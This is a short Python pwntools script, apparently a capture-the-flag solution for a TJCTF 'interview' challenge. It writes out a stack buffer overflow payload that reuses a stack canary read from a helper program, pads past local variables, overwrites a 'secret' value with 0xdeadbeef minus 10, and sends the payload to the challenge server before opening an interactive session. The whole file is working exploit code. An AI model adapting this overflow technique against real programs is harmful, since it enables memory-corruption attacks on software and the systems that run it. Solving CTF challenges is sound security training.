import os
import re
import struct
from pwn import *

payload = "A"*64

canary = [int(i) for i in re.findall(r"[0-9]+", os.popen("./canary").read())]

# package stack canary
for i in canary:
	payload += struct.pack("I", i)

# zero i
payload += struct.pack("I", 0xaaaabbbb)
payload += struct.pack("I", 0x00000000)

# overflow up to secret
for i in range(4):
	payload += struct.pack("I", 0xCCCCDDDD)

# overwrite secret 
# (subtract 10 b/c that is value of j after for loop exec)
payload += struct.pack("I", 0xdeadbeef - 10)

#p = process('./interview_modified')
#p = process('./interview')
p = remote('problem1.tjctf.org', 8000)
p.recvlines(2)
p.sendline(payload)
p.interactive()
